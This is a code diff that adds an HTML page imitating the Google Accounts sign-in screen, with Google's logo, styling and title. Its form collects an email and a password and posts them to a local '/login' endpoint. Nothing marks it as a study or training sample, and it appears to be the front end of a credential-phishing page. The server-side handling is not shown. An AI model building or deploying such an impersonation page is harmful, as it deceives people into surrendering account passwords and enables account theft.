@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            max-width: 360px;
+            background: #fff;
+            padding: 24px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .google-logo {
+            margin-bottom: 16px;
+        }
+
+        .google-logo img {
+            width: 100px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin: 16px 0;
+            color: #202124;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+
+        .btn:hover {
+            background-color: #155bb5;
+        }
+
+        .link {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="google-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Logo_2013_Google.png" alt="Google">
+        </div>
+        <h1>Sign in</h1>
+        <form action="/login" method="POST">
+            <input class="input-field" type="email" name="email" placeholder="Email or phone" required>
+            <input class="input-field" type="password" name="password" placeholder="Enter your password" required>
+            <button class="btn" type="submit">Next</button>
+        </form>
+        <a href="#" class="link">Forgot email?</a>
+        <a href="#" class="link">Create account</a>
+    </div>
+</body>
+</html>
